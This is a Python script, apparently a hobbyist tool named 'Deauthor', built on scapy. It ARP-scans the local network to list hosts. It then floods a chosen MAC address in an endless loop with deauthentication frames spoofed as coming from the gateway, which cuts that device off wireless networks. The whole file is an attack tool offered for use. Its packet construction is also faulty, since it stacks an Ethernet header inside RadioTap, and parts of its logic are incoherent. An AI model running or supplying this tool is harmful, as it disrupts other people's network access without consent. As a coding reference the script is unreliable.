# Deauth tool written in scapy. 24/01/2024 
# Version 1.0


from scapy.all import *
import os
import time

global get_gateway

def deauth():  # Deauth packets sent to the users nominated host.
    def mac_addr():
        global mac_address
        mac_address = input('ENTERMAC: ')
        def_len = 'ff:ff:ff:ff:ff:ff'
        if mac_address == '':
            print('This field cannot be empty.')
            time.sleep(2)
            return deauth()
        elif len(mac_address) == len(def_len):
            pass
        else:
            print('Incorrect format for MAC Address. ')
            time.sleep(2)
            return deauth()
        
    
    os.system('clear')
    menu_of_items_Deauth = input('''
| ## Deauth ##
|
| 1, Enter MAC
| 2, START DEAUTH
| 3, BACK
|    
  >> ''')

    
    if menu_of_items_Deauth == '1':
        mac_addr()
        print('MAC ADDRESS SET!')
        time.sleep(1)
        os.system('clear')
        return deauth()

    elif menu_of_items_Deauth == '2':
        get_gateway = conf.route.route('0.0.0.0')[2]
        mac_gateway = getmacbyip(get_gateway)
        confirmation = input('y/n to confirm: ')
        if confirmation == 'y':
            while True:
                deauth_frame = RadioTap()/Ether(src=mac_gateway, dst=mac_address)/Dot11(subtype=12)
                sendp(deauth_frame)
        elif confirmation == 'n':
            return deauth()
        else:
            return deauth()
    elif menu_of_items_Deauth == '3':
        return menu()

    else:
        os.system('clear')
        return deauth()
        
    

def get_local_devices(get_gateway):  # Sends ARP Request to discover hosts.
    print('## Scanning network, hold Ctrl C to cancel. ##')
    print('')
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=get_gateway), timeout=6)
    ans.summary(lambda s,r: r.sprintf("IP Address: %ARP.psrc% MAC Address: %Ether.src%"))
    time.sleep(2)
    print('')
    print('Network scan complete!')
    print('')
    menu_return = input('''
Would you like to rescan? n to return to menu.

y/n: ''')
    
    if menu_return == 'n':
        print('')
        print('Returning to menu...')
        time.sleep(1)
        return menu()
    elif menu_return == 'y':
        get_local_devices(get_gateway)
    
    
    

def resolve_gateway():  # Resolves gateway IP
    global get_gateway
    
    os.system('clear')
    get_gateway = conf.route.route('0.0.0.0')[2]
    get_local_devices(get_gateway)
    map(deauth, get_gateway)


def menu():  # Choose to scan or Deauth a Node. 
    os.system('clear')
    men_u = input('''
| ## Deauthor | Made by StaleCrescent65 ##
|
|    
| 1) Scan Network
| 2) Deauth Attack 
|
|
  >> ''')
    
    if men_u == '1':
        time.sleep(1)
        resolve_gateway()
    elif men_u == '2':
        time.sleep(1)
        deauth()        
    

menu()  



